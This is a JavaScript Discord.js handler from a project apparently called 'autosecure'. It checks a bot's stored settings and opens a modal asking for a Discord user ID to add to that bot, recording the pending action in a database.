const { TextInputStyle } = require("discord.js")
const { queryParams } = require("../../../db/database")
const modalBuilder = require("../../utils/modalBuilder")
const generate = require("../../../autosecure/utils/utils/generate")

module.exports = {
  name: "adduser",
  editclaiming: true,
  callback: async (client, interaction) => {
      const userCount = interaction.customId.split("|")[1]
    const ownerid = interaction.customId.split("|")[2]
    const botnumber = interaction.customId.split("|")[3]

    
    let settings = await queryParams(`SELECT * FROM autosecure WHERE user_id=? AND botnumber=?`, [ownerid, botnumber])
    if (settings.length === 0) {
      return interaction.reply({
        embeds: [{
          title: `Error :x:`,
          description: `Unexpected error occurred!`,
          color: 0xff0000
        }],
        ephemeral: true
      })
    }
    settings = settings[0]



    let rId = generate(32)
    await queryParams(`INSERT INTO actions (id, action) VALUES (?, ?)`, [rId, `adduser|${userCount}|${ownerid}|${botnumber}`])

    interaction.showModal(modalBuilder(`action|${rId}`, 'Add User', [{
      setCustomId: 'userid',
      setMaxLength: 21,
      setMinLength: 1,
      setRequired: true,
      setLabel: "User ID",
      setPlaceholder: "Ex: 1285310494143680626",
      setStyle: TextInputStyle.Short
    }]))
  }
}
